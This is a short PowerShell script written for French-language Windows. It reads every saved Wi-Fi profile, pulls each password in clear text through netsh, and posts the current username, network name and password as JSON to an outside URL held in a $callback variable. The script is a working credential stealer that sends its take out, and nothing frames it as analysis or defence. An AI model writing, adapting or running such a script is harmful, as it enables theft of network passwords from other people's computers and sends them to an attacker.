netsh wlan show profile | Select-String '(?<=Profil Tous les utilisateurs\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenu de la clé\s+:\s).+'

$Body = @{
'username' = $env:username + " | " + [string]$wlan
'content' = [string]$passw
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri $callback -Method Post -Body ($Body | ConvertTo-Json)
}
